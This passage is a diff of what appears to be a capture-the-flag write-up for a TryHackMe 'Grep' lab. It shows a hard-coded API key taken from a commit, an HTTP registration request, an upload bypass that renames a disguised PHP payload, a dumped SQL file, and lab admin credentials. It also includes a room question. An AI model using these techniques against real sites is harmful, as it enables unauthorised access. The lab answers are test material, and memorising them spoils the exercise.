@@ -429,7 +429,6 @@ https://github.com/supersecuredeveloper/searchmecms/commit/db11421db2324ed0991c3
 |||if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {|
 |||if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {|
 
-
 POST /api/register.php HTTP/1.1
 
 Host: grep.thm
@@ -464,10 +463,7 @@ Te: trailers
 
 Connection: close
 
-
-
 {"username":"test","password":"test","email":"test@gmail.com","name":"test"}
-
 
 HTTP/1.1 200 OK
 
@@ -480,8 +476,6 @@ Content-Length: 38
 Connection: close
 
 Content-Type: application/json
-
-
 
 {"message":"Registration successful."}
 
@@ -551,7 +545,6 @@ hexeditor
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ mv payload_monkey.php.jpg payload_monkey_test.php
 
-
 {"message":"File uploaded successfully."}
 
 https://grep.thm/api/uploads/
@@ -618,7 +611,6 @@ cat users.sql
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
 START TRANSACTION;
 SET time_zone = "+00:00";
-
 
 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
 /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
@@ -704,10 +696,6 @@ Email: admin@searchme2023cms.grep.thm
 Password: admin_tryhackme! 
 
 ```
-
-![[Pasted image 20230820144608.png]]
-
-![[Pasted image 20230820145147.png]]
 
 What is the API key that allows a user to register on the website?
 
